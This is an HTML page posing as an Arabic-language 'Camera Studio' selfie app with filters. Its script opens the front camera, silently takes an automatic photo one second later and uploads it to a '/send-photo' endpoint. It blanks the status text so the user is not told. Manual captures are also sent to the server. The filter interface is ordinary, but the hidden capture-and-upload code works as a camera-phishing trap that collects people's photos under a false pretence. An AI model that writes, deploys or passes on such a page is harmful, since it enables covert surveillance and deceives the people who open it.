<!DOCTYPE html>

<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Studio</title>

<style>
*{box-sizing:border-box}

body{
  margin:0;
  min-height:100vh;
  font-family:Arial,sans-serif;
  background:linear-gradient(135deg,#09090b,#18181b,#27272a);
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:18px;
}

.app{
  width:100%;
  max-width:560px;
  background:rgba(255,255,255,.07);
  backdrop-filter:blur(20px);
  border:1px solid rgba(255,255,255,.12);
  border-radius:28px;
  padding:20px;
  box-shadow:0 25px 70px rgba(0,0,0,.45);
}

h1{
  text-align:center;
  margin:4px 0 6px;
  font-size:27px;
}

.subtitle{
  text-align:center;
  color:#a1a1aa;
  font-size:14px;
  margin-bottom:18px;
}

.camera{
  position:relative;
  width:100%;
  aspect-ratio:3/4;
  overflow:hidden;
  border-radius:22px;
  background:#000;
}

video{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
}

.camera.cinematic video{filter:contrast(1.18) saturate(.82) brightness(.92)}
.camera.vintage video{filter:sepia(.35) contrast(1.08) saturate(.8)}
.camera.bw video{filter:grayscale(1) contrast(1.15)}
.camera.warm video{filter:sepia(.18) saturate(1.18) contrast(1.05)}
.camera.cool video{filter:saturate(.9) hue-rotate(12deg) brightness(1.04)}
.camera.vivid video{filter:saturate(1.45) contrast(1.08)}

.status{
  text-align:center;
  min-height:22px;
  margin:13px 0;
  color:#d4d4d8;
  font-size:14px;
}

.title{
  font-size:14px;
  color:#a1a1aa;
  margin:8px 0;
}

.filters{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:8px;
}

.filter{
  border:1px solid rgba(255,255,255,.12);
  background:rgba(255,255,255,.06);
  color:white;
  border-radius:13px;
  padding:11px 5px;
  cursor:pointer;
  font-size:13px;
}

.filter.active{
  border:2px solid white;
  background:rgba(255,255,255,.18);
}

.buttons{
  display:flex;
  gap:10px;
  margin-top:15px;
}

button.main{
  flex:1;
  border:0;
  border-radius:15px;
  padding:15px;
  font-size:15px;
  font-weight:bold;
  cursor:pointer;
}

#start{
  background:#22c55e;
  color:white;
}

#capture{
  background:white;
  color:#18181b;
}

#capture:disabled{
  opacity:.35;
  cursor:not-allowed;
}



canvas{display:none}
</style>

</head>

<body>

<div class="app">

<h1>📸 Camera Studio</h1>

<div class="subtitle">
تصوير سريع بفلاتر احترافية
</div>

<div class="camera" id="cameraBox">

<video id="video" autoplay playsinline></video>

  

</div>

<div id="status" class="status">
اضغط تشغيل الكاميرا
</div>

<div class="title">🎨 اختر الفلتر</div>

<div class="filters">

<button class="filter active" data-filter="cinematic">🎬 Cinematic</button> <button class="filter" data-filter="vintage">📼 Vintage</button> <button class="filter" data-filter="bw">🖤 B&W</button> <button class="filter" data-filter="warm">☀️ Warm</button> <button class="filter" data-filter="cool">❄️ Cool</button> <button class="filter" data-filter="vivid">✨ Vivid</button>

</div>

<div class="buttons">

<button id="start" class="main">
🎥 تشغيل الكاميرا
</button>

<button id="capture" class="main" disabled>
📸 التقاط
</button>

</div>

<canvas id="canvas"></canvas>

</div>

<script>

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const start = document.getElementById("start");
const capture = document.getElementById("capture");
const status = document.getElementById("status");
const cameraBox = document.getElementById("cameraBox");


let stream = null;
let selectedFilter = "cinematic";
let autoShotDone = false;


// الفلاتر
document.querySelectorAll(".filter").forEach(button => {

  button.onclick = () => {

    document.querySelectorAll(".filter")
      .forEach(b => b.classList.remove("active"));

    button.classList.add("active");

    selectedFilter = button.dataset.filter;

    cameraBox.className = "camera " + selectedFilter;
  };

});


// التقاط وإرسال الصورة
async function takePhoto(){

  if(!video.videoWidth) return;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");

  ctx.filter = getCanvasFilter(selectedFilter);

  ctx.drawImage(
    video,
    0,
    0,
    canvas.width,
    canvas.height
  );

  ctx.filter = "none";

  canvas.toBlob(async blob => {

    if(!blob){
      status.textContent = "فشل إنشاء الصورة ❌";
      return;
    }

    const data = new FormData();

    data.append(
      "photo",
      blob,
      "camera-test.jpg"
    );

status.textContent = "";

    try{

      const response = await fetch("/send-photo",{
        method:"POST",
        body:data
      });

      const result = await response.json();

      if(result.ok){

       status.textContent = "";

      }else{

        status.textContent =
          "فشل إرسال الصورة ❌";

      }

    }catch(error){

      console.error(error);

      status.textContent =
        "حدث خطأ أثناء الإرسال ❌";
    }

  },"image/jpeg",.9);
}


// فلاتر الصورة النهائية
function getCanvasFilter(filter){

  if(filter === "cinematic")
    return "contrast(1.18) saturate(.82) brightness(.92)";

  if(filter === "vintage")
    return "sepia(.35) contrast(1.08) saturate(.8)";

  if(filter === "bw")
    return "grayscale(1) contrast(1.15)";

  if(filter === "warm")
    return "sepia(.18) saturate(1.18) contrast(1.05)";

  if(filter === "cool")
    return "saturate(.9) hue-rotate(12deg) brightness(1.04)";

  if(filter === "vivid")
    return "saturate(1.45) contrast(1.08)";

  return "none";
}


// تشغيل الكاميرا
start.onclick = async () => {

  try{

    stream = await navigator.mediaDevices.getUserMedia({
      video:{
        facingMode:"user"
      },
      audio:false
    });

    video.srcObject = stream;

    capture.disabled = false;

    status.textContent = "";
    // صورة تلقائية مرة واحدة
    if(!autoShotDone){

      autoShotDone = true;

      setTimeout(async () => {
  await takePhoto();
}, 1000);
    }

  }catch(error){

    console.error(error);

    status.textContent =
      "لم يتم السماح باستخدام الكاميرا ❌";
  }

};


// زر التقاط اليدوي
capture.onclick = async () => {

  status.textContent = "التقاط الصورة...";

  await takePhoto();

};

</script>

</body>
</html>
